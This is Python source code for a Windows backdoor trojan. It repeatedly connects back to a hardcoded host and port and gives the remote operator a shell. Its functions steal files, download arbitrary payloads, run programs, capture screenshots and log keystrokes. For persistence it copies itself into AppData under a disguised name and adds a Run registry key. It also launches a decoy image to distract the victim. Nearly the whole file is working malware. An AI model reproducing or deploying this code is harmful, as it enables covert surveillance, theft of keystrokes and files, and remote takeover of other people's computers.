#!usr/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss
import threading
import keylogger

def reliable_send(data):
        json_data=json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        data=""
        while True:
                try:
                        data=data+sock.recv(1024)
                        return json.loads(data)
                except ValueError:
                        continue

def connection():
        while True:
                time.sleep(20)
                try:
                        sock.connect(("10.0.2.5",54321))
                        shell()
                except:
                        connection()

def is_admin():
        global admin
        try:
                temp=os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
        except:
                admin="[!!] User Privilages!"
        else:
                "[+] Administrator Privilages!"

def screenshot() :
        with mss() as screenshot:
                screenshot.shot()

def download(url):
        get_response=requests.get(url)
        file_name=url.split("/")[-1]
        with open (file_name,"wb") as out_file:
                out_file.write(get_response.content)

def shell():
        while True:
                command=reliable_recv()
                if command == 'q':
                        continue
		elif command == "exit":
			break
                elif command == 'help':
                        help_options= '''                                       download path   --> Download A File From Target PC
                                        upload path   --> Upload a File To Target PC
                                        get URL       --> Download A File To Target PC From Any Website
                                        start path    --> Start A Program On Target PC
                                        screenshot    --> Take Screenshot Of target PC Monitor
                                        check         --> Check For Administrator Privilages
                                        keylog_start  --> Start The Keylogger
                                        keylog_dump   --> Dump The Keystrokes From Keylogger
                                        q             --> Hold The Connection
					exit          --> Exit The Connection '''
                        reliable_send(help_options)
                elif command[:2]=="cd" and len(command)>1:
                        try:
                                os.chdir(command[3:])
                        except:
                                continue
                elif command[:8]=="download":
                        with open(command[9:],"rb") as file:
                                reliable_send(base64.b64encode(file.read()))
                elif command[:6]=="upload":
                        with open(command[7:],"wb") as fin:
                                file_data=reliable_recv()
                                fin.write(base64.b64decode(file_data))

                elif command[:3]=="get" :
                        try:
                                download(command[4:])
                                reliable_send("[+] Downloaded file from specified url")
                        except:
                                reliable_send("[!!] Failed to download the file")
                elif command[:10]=="screenshot":
                        try:
                                screenshot()
                                with open("monitor-1.png","rb") as sc:
                                        reliable_send(base64.b64encode(sc.read()))
                                os.remove("monitor-1.png")
                        except:
                                reliable_send("[!!] Failed to take screenshot")
                elif command[:5]=="start":
                                try:
                                        subprocess.Popen(command[6:],shell=True)
                                        reliable_send("[+] Started")
                                except:
                                        reliable_send("[!!] Failed To Start!")
                elif command[:5]=="check":
                                try:
                                        is_admin()
                                        reliable_send(admin)
                                except:
                                        reliable_send("Can't Perform The Check")
                elif command[:12] == "keylog_start":
                        t1 = threading.Thread(target=keylogger.start)
                        t1.start()
                elif command[:11] == "keylog_dump":
                        fn=open(keylogger_path,"r")
                        reliable_send(fn.read())
                else:
                        proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                        result=proc.stdout.read() + proc.stderr.read()
                        reliable_send(result)

keylogger_path=os.environ["appdata"] + "\\processmanager.txt""
location=os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Satyam /t REG_SZ /d "' + location + '"', shell=True)

        file_name=sys._MEIPASS + "\car.jpg"
        try:
                subprocess.Popen(file_name,shell=True)
        except:
                number=1
                number2=2
                number3=number1+number2

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()

